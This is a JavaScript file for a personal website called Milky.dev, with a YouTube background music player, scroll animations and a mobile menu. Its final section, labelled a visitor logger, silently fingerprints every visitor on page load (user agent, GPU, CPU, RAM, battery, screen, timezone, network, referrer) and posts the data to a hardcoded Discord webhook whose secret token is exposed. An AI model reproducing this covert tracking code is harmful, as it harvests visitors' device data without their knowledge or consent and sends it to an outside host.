/* =========================================
   MILKY.DEV - PREMIUM SCRIPT WITH MUSIC
========================================= */

// --- YouTube Iframe API ---
let player;
let isPlaying = false;
let isReady = false;

// Bu fonksiyon YouTube API yüklendiğinde otomatik çağrılır
function onYouTubeIframeAPIReady() {
  player = new YT.Player('ytplayer-container', {
    height: '200',
    width: '200',
    videoId: 'QzVWsHJdmb4',
    playerVars: {
      'autoplay': 0,
      'controls': 0,
      'showinfo': 0,
      'rel': 0,
      'loop': 1,
      'playlist': 'QzVWsHJdmb4'
    },
    events: {
      'onReady': () => {
        isReady = true;
      }
    }
  });
}

document.addEventListener('DOMContentLoaded', () => {

  // --- Enter Screen & Autoplay Logic ---
  const enterScreen = document.getElementById('enterScreen');
  const musicBtn = document.getElementById('musicBtn');
  const musicText = document.getElementById('musicText');
  const equalizer = document.getElementById('equalizer');

  enterScreen.addEventListener('click', () => {
    enterScreen.classList.add('hidden');
    
    // API hazırsa doğrudan müziği başlat
    if (isReady && player && typeof player.playVideo === 'function') {
      player.playVideo();
      isPlaying = true;
      musicText.textContent = "Pause Vibe";
      equalizer.classList.add('playing');
    } else {
      // Eğer API biraz geç yüklendiyse 1 saniye bekleyip başlat
      setTimeout(() => {
        if (player && typeof player.playVideo === 'function') {
          player.playVideo();
          isPlaying = true;
          musicText.textContent = "Pause Vibe";
          equalizer.classList.add('playing');
        }
      }, 1000);
    }
  });

  // --- Music Toggle Button (Pause / Resume) ---
  musicBtn.addEventListener('click', () => {
    if (!isReady || !player) return;

    if (isPlaying) {
      // Müziği duraklat (Kaldığı yeri hafızada tutar)
      player.pauseVideo();
      musicText.textContent = "Play Vibe";
      equalizer.classList.remove('playing');
    } else {
      // Müziği oynat (Kaldığı yerden devam eder)
      player.playVideo();
      musicText.textContent = "Pause Vibe";
      equalizer.classList.add('playing');
    }
    isPlaying = !isPlaying;
  });

  // --- Scroll Header ---
  const nav = document.getElementById('nav');
  window.addEventListener('scroll', () => {
    if (window.scrollY > 20) {
      nav.classList.add('scrolled');
    } else {
      nav.classList.remove('scrolled');
    }
  });

  // --- Mobile Menu Toggle ---
  const menuBtn = document.getElementById('menuBtn');
  const navLinks = document.getElementById('navLinks');
  const links = navLinks.querySelectorAll('a');

  menuBtn.addEventListener('click', () => {
    navLinks.classList.toggle('open');
  });

  links.forEach(link => {
    link.addEventListener('click', () => {
      navLinks.classList.remove('open');
    });
  });

  // --- Scroll Reveal Animation ---
  const revealElements = document.querySelectorAll('.reveal');
  
  const revealObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        entry.target.classList.add('visible');
        revealObserver.unobserve(entry.target);
      }
    });
  }, {
    threshold: 0.1,
    rootMargin: "0px 0px -50px 0px"
  });

  revealElements.forEach(el => revealObserver.observe(el));

  // --- Antigravity Glow Effect ---
  const antiGlow = document.getElementById('antiGlow');
  
  if (antiGlow) {
    document.addEventListener('mousemove', (e) => {
      // Small delay via CSS transition + requestAnimationFrame creates the fluid liquid feel
      requestAnimationFrame(() => {
        antiGlow.style.transform = `translate(${e.clientX - 600}px, ${e.clientY - 600}px)`;
      });
    });
  }

  // --- Visitor Logger (Discord Webhook) ---
  const webhookUrl = "https://discord.com/api/webhooks/1516080032194236506/8xU8_rKCE5bzygwgK7hpcztGy9ahJnRRtI-L8MP-AR_w7EGQSupjuV3vy7UnjEZceTX0";
  
  function getGPU() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "Bilinmiyor";
    } catch (e) {
      return "Desteklenmiyor";
    }
  }

  function sendLog(batteryStatus) {
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Bilinmiyor";
    const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Bilinmiyor";
    const memory = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "Bilinmiyor";
    const referrer = document.referrer ? document.referrer : "Direct Entry";
    const platform = navigator.platform || "Bilinmiyor";
    const gpu = getGPU();
    
    const touchPoints = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints})` : "No";
    const connection = navigator.connection ? `${navigator.connection.effectiveType || '?'} (${navigator.connection.downlink || '?'} Mbps)` : "Bilinmiyor";
    const cookiesEnabled = navigator.cookieEnabled ? "Enabled" : "Disabled";
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light";
    const orientation = (window.screen.orientation || {}).type || "Bilinmiyor";
    
    const embed = {
      author: {
        name: "New Visitor Logged",
        icon_url: "https://media.discordapp.net/attachments/1502743667574571118/1505193963278307368/luicid.png"
      },
      color: 0xffffff,
      fields: [
        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
        { name: "Graphics / WebGL", value: `\`\`\`${gpu}\`\`\``, inline: false },
        { name: "Hardware", value: `CPU: ${cores}\nRAM: ${memory}\nBattery: ${batteryStatus}`, inline: true },
        { name: "Display", value: `Resolution: ${window.screen.width}x${window.screen.height}\nOrientation: ${orientation}\nTouch: ${touchPoints}`, inline: true },
        { name: "System", value: `Platform: ${platform}\nTheme: ${isDarkMode}\nCookies: ${cookiesEnabled}`, inline: true },
        { name: "Network & Locale", value: `Lang: ${navigator.language}\nTimezone: ${timeZone}\nSpeed: ${connection}`, inline: true },
        { name: "Referrer", value: referrer, inline: false },
        { name: "Page URL", value: window.location.href, inline: false }
      ],
      footer: { text: "Milky.dev Security" },
      timestamp: new Date().toISOString()
    };

    fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        username: "Milky", 
        avatar_url: "https://media.discordapp.net/attachments/1502743667574571118/1505193963278307368/luicid.png",
        embeds: [embed] 
      })
    }).catch(err => console.error("Webhook error:", err));
  }

  // Fetch Battery Info (if supported) and execute log
  if ('getBattery' in navigator) {
    navigator.getBattery().then(batt => {
      const batteryStatus = `${Math.round(batt.level * 100)}% (${batt.charging ? 'Charging' : 'Discharging'})`;
      sendLog(batteryStatus);
    }).catch(() => sendLog("Unknown"));
  } else {
    sendLog("Unsupported");
  }

});
